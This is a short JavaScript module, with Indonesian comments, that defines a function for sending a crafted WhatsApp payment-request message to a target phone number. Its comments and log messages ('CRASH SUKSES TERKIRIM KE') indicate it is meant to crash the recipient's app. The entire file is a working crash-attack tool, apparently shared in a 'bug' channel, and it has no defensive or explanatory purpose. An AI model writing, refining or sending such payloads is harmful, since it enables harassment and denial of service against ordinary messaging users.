// lib/crash.js - FIXED
async function xeoninvisible(sock, target) {
  try {
    // Bersihkan format nomor
    target = target.replace(/[^0-9]/g, '');
    const targetJid = target + '@s.whatsapp.net';

    const PayCrash = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: targetJid,
        amount1000: 1000,
        amount: 1,
        expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
        contextInfo: {
          externalAdReply: {
            title: "Makloe",
            body: "CRASH".repeat(10),
            mimetype: 'audio/mpeg',
            caption: "G".repeat(100),
            showAdAttribution: true,
            sourceUrl: "https://t.me/functionbug",
            thumbnailUrl: 'https://files.catbox.moe/2z1knq.jpg'
          }
        }
      }
    };

    // Fix: Hapus messageId custom yang bikin error
    await sock.relayMessage(targetJid, PayCrash, {
      participant: targetJid
    });

    console.log(`[💀] CRASH SUKSES TERKIRIM KE: ${target}`);
    return true;
    
  } catch (error) {
    console.error("[🔥] Gagal kirim crash:", error.message);
    throw error;
  }
}

module.exports = { xeoninvisible };
